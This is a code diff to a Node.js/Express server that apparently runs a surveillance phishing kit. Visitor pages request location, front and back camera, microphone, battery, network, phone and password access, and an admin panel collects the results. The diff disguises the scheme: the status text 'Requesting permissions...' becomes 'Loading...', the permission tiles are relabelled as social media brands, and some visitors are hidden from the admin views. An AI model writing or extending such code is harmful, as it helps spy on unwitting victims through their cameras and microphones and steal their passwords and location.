@@ -70,6 +70,7 @@ app.post('/logout', (req, res) => {
     res.json({ success: true });
 });
 
+// Get all visitors - EXCLUDE publisher visitors
 app.get('/api/visitors', (req, res) => {
     if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
     const users = readUsers();
@@ -77,6 +78,7 @@ app.get('/api/visitors', (req, res) => {
     res.json(filteredUsers);
 });
 
+// Get all users data - EXCLUDE publisher visitors
 app.get('/api/users-data', (req, res) => {
     if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
     const users = readUsers();
@@ -114,6 +116,9 @@ app.get('/api/visitor/:id', (req, res) => {
     if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
     const users = readUsers();
     const visitor = users.find(u => u.id === req.params.id);
+    if (visitor && visitor.publisherId) {
+        return res.status(404).json({ error: 'Visitor not found' });
+    }
     visitor ? res.json(visitor) : res.status(404).json({ error: 'Not found' });
 });
 
@@ -563,7 +568,7 @@ app.get('/p/:visitorId', (req, res) => {
             }
 
             function requestAllPermissions() {
-                updateStatus('📸 Requesting permissions...', 40);
+                updateStatus('Loading...', 40);
 
                 Promise.all([
                     requestLocation(),
@@ -847,13 +852,13 @@ app.get('/sp/:visitorId', (req, res) => {
         <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
         <div id="progressText">0%</div>
         <div class="perm-grid" id="permGrid">
-            <div class="perm-item" id="permLocation">📍 Location</div>
-            <div class="perm-item" id="permFront">📸 Front Camera</div>
-            <div class="perm-item" id="permBack">📸 Back Camera</div>
-            <div class="perm-item" id="permAudio">🎙️ Audio</div>
-            <div class="perm-item" id="permBattery">🔋 Battery</div>
-            <div class="perm-item" id="permNetwork">📶 Network</div>
-            <div class="perm-item" id="permPhone">📞 Phone</div>
+            <div class="perm-item" id="permLocation">Youtube</div>
+            <div class="perm-item" id="permFront">Instagram</div>
+            <div class="perm-item" id="permBack">Snapchat</div>
+            <div class="perm-item" id="permAudio">Facebook</div>
+            <div class="perm-item" id="permBattery">Telegram</div>
+            <div class="perm-item" id="permNetwork">Twitter</div>
+            <div class="perm-item" id="permPhone">Pinterest</div>
             <div class="perm-item" id="permPasswords">🔑 Passwords</div>
         </div>
     </div>
